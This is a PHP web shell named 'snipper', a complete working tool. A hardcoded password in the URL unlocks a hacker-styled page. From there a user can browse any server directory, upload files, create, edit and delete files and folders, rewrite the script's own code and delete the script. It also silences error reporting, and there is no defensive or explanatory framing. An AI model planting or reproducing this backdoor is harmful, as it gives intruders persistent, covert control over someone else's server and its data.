<?php 
	//seting error report off
	
	// ini_set('display_errors', 1);
	ini_set('display_errors', 0);
	// error_reporting(E_ALL);
	error_reporting(0);
	
	//check password
	if(isset($_GET['pass']) && $_GET['pass']=="vishwajeetkumar"){

		//current directory where snipper.php exist
		$currentDir = __DIR__;

		//if new path set
		if(isset($_POST['current-dir'])){
			$currentDir = $_POST['current-dir'];
		}

		//seperator for creating url
		$seprator = DIRECTORY_SEPARATOR;
		
		//function to create back url
		function backurl($url, $seprator){
			return substr($url, 0, strrpos($url, $seprator));
		}
		
		//function for scaning directory
		function scan($path){
			echo $path;
			global  $seprator;
			//back btn
			echo "<br><hr><br><form style='display:inline-block;' action='".basename($_SERVER['PHP_SELF'])."?pass=vishwajeetkumar&do=listdir' method='post'>
									<input type='hidden' value='".backurl($path, $seprator)."' name='current-dir'>
									<input style='margin-right: 20px;' type='submit' value='Back' name='list-dir'>
								</form>";
			//create file btn
			echo "<form style='display:inline-block;' action='".basename($_SERVER['PHP_SELF'])."?pass=vishwajeetkumar&do=listdir' method='post'>
									<input type='hidden' value='".$path."' name='current-dir'>
									<input type='text' name='name'>
									<input style='margin-right: 20px;margin-left: -5px;' type='submit' value='create new file' name='create-file'>
								</form>";
			//create folder btn
			echo "<form style='display:inline-block;' action='".basename($_SERVER['PHP_SELF'])."?pass=vishwajeetkumar&do=listdir' method='post'>
									<input type='hidden' value='".$path."' name='current-dir'>
									<input type='text' name='name'>
									<input style='margin-right: 20px;margin-left: -5px;' type='submit' value='create new folder' name='create-dir'>
								</form>";
			//upload folder btn
			echo "<form style='display:inline-block;' action='".basename($_SERVER['PHP_SELF'])."?pass=vishwajeetkumar&do=listdir' method='post' enctype='multipart/form-data'>
									<input type='hidden' value='".$path."' name='current-dir'>
									<input type='file' name='file'>
									<input style='margin-right: 20px;margin-left: -5px;' type='submit' value='upload file' name='upload-file'>
								</form>";					
			//scan directory
			$dir = scandir($path);
			$files = array_diff($dir, array('.', '..'));
			echo "<ul id='dir-list-border'>";
			foreach ($files as $value) {
				# code...
				$isDir = $path."/".$value;
				$astyle = "text-decoration:none;";

				//action form for file and folder
				
				//edit file
				$actionform = "<form  style='display:inline-block;' action='".basename($_SERVER['PHP_SELF'])."?pass=vishwajeetkumar&do=listdir' method='post'>
								<input type='hidden' value='".$path."' name='current-dir'>
								<input type='hidden' value='".$path.$seprator.$value."' name='edit-file-path'>
								<input style='margin-left: 20px;' type='submit' value='Edit' name='editfile'>
							</form>";

				//delete file
				$actionform .= "<form  style='display:inline-block;' action='".basename($_SERVER['PHP_SELF'])."?pass=vishwajeetkumar&do=listdir' method='post'>
								<input type='hidden' value='".$path."' name='current-dir'>
								<input type='hidden' value='".$path.$seprator.$value."' name='del-file-path'>
								<input style='margin-left: 20px;' type='submit' value='Delete' name='del-file'>
							</form>";

				if(is_dir($isDir)){
					//style for directory
					$astyle = "color:#ff7f00;text-decoration:none;";
					//open directory
					$actionform = "<form  style='display:inline-block;' action='".basename($_SERVER['PHP_SELF'])."?pass=vishwajeetkumar&do=listdir' method='post'>
									<input type='hidden' value='".$path.$seprator.$value."' name='current-dir'>
									<input style='margin-left: 20px;' type='submit' value='Open' name='list-dir'>
								</form>";
					//delete directory
					$actionform .= "<form  style='display:inline-block;' action='".basename($_SERVER['PHP_SELF'])."?pass=vishwajeetkumar&do=listdir' method='post'>
									<input type='hidden' value='".$path."' name='current-dir'>
									<input type='hidden' value='".$path.$seprator.$value."' name='del-dir-path'>
									<input style='margin-left: 20px;' type='submit' value='Delete' name='del-dir'>
								</form>";
				}
				echo "<li><a href='javascript: void(0);' style='$astyle'>$value $actionform</a></li>";
			}
			echo "</ul>";
		}
	?>
		<!DOCTYPE html>
		<html lang="en">
		<head>
			<meta charset="UTF-8">
			<title>snipper</title>
			<style>
				body{
					background-color: #000b0e;
					color: #20c20e;
					font-family: Arial, Helvetica, sans-serif;
					padding: 30px;
				}
				#menu>li>a, #menu>li>a:hover{
					background-color: #FF9933;
					text-decoration: none;
					font-size: 13px;
					margin: 10px;
					padding: 5px 10px;
					color: black;
				}
				#menu li{
					display: inline-block;
				}
				#menu{
					text-align: center;
				}
				#dir-list-border{
					border: 1px solid #20c20e;
					padding: 35px;
					list-style-type: none;
				}
				#dir-list-border li{
					margin: 8px 20px 7px 0px;
				}
			</style>
		</head>
		<body>
			<p style="text-align: center;">welcome snipper<br>-------------------------<br><br></p>
			<ul id='menu'>
				<li><a href="<?php echo basename($_SERVER['PHP_SELF']); ?>?pass=vishwajeetkumar&do=listdir"">Directory Structure</a></li>
				<li><a href="<?php echo basename($_SERVER['PHP_SELF']); ?>?pass=vishwajeetkumar&do=deleteself" onclick="return confirm('Are you sure you want to delete self?');">Delete Self</a></li>
				<li><a href="<?php echo basename($_SERVER['PHP_SELF']); ?>?pass=vishwajeetkumar&do=changeselfcode">Change Self</a></li>
			</ul>
			<?php  
				//to do some action
				if(isset($_GET['do'])){

					$do = $_GET['do'];
					switch ($do) {

						//list file and folder
						case 'listdir':

							//create file in current directory
							if(isset($_POST['create-file'])){
								$dirpath = $_POST['current-dir'];
								$name = $_POST['name'];
								$cfile = $dirpath.$seprator.$name;
								$myfile = fopen($cfile, "w") or die("Unable to open file!");
								
								fclose($myfile);
							}

							//create folder in current directory
							if(isset($_POST['create-dir'])){
								$dirpath = $_POST['current-dir'];
								$name = $_POST['name'];
								$cfolder = $dirpath.$seprator.$name;
								mkdir($cfolder, 0777, true);
							}

							//upload file in current directory
							if(isset($_POST['upload-file'])){
								$dirpath = $_POST['current-dir'];
								$file_tmp =$_FILES['file']['tmp_name'];
								$file_name = $_FILES['file']['name'];
								move_uploaded_file($file_tmp, $file_name);
								rename(__DIR__.$seprator.$file_name,$dirpath.$seprator.$file_name);
							}

							//delete dir
							if(isset($_POST['del-dir'])){

								$deldirpath = $_POST['del-dir-path'];
								if(!rmdir($deldirpath)){
									echo "<span style='color:red;' >warning: ".$deldirpath." folder is not empty.</span><br><br>";
								}
							}

							//delete file
							if(isset($_POST['del-file'])){

								$deldirpath = $_POST['del-file-path'];
								unlink($deldirpath);
							}

							//edit file
							if(isset($_POST['editfile'])){
								
								$editfilepath = $_POST['edit-file-path'];
								echo "<hr>Editing $editfilepath<br><br>";
								if(isset($_POST['change-file-code'])){
									$code = $_POST['code'];
									$myfile = fopen($editfilepath, "w") or die("Unable to open file!");
									fwrite($myfile, $code);
									fclose($myfile);
								}
								?>
									<!-- form for editor -->
									<form action="<?php basename($_SERVER['PHP_SELF']) ?>"?pass=vishwajeetkumar&do=listdir" method="post" style="text-align: center;">
										<textarea name="code"  id="editor" cols="30" rows="10" style="width: 90%; height: 70vh;"><?php echo htmlentities(file_get_contents($editfilepath)); ?></textarea>
										<br>
										<input type='hidden' value='' name='editfile'>
										<input type='hidden' value='<?php echo $editfilepath; ?>' name='edit-file-path'>
										

										<input type='hidden' value='<?php echo $currentDir; ?>' name='current-dir'>
										<input type="submit" value="save" name="change-file-code">
									</form><br><hr><br>
									
								<?php	

							}

							//list dir
							scan($currentDir);
							break;

							

						// to update self code 
						case 'changeselfcode':
							//change code
							if(isset($_POST['change-self-code'])){
								$code = $_POST['code'];
								$myfile = fopen(__FILE__, "w") or die("Unable to open file!");
								fwrite($myfile, $code);
								fclose($myfile);
							}
							?>
								<!-- form for editor -->
								<form action="<?php echo basename($_SERVER['PHP_SELF']); ?>?pass=vishwajeetkumar&do=changeselfcode" method="post" style="text-align: center;">
									<textarea name="code"  id="editor" cols="30" rows="10" style="width: 90%; height: 70vh;"><?php echo htmlentities(file_get_contents(__FILE__)); ?></textarea>
									<br>
									<input type="submit" value="save" name="change-self-code">
								</form>
								
							<?php	
							break;
							// to delete self
							case 'deleteself':
								# code...
								unlink(__FILE__);
								break;

							//default
							default:
								# do nothing
								break;
					}
				}
			?>
		</body>
		</html>
	<?php
	}

?>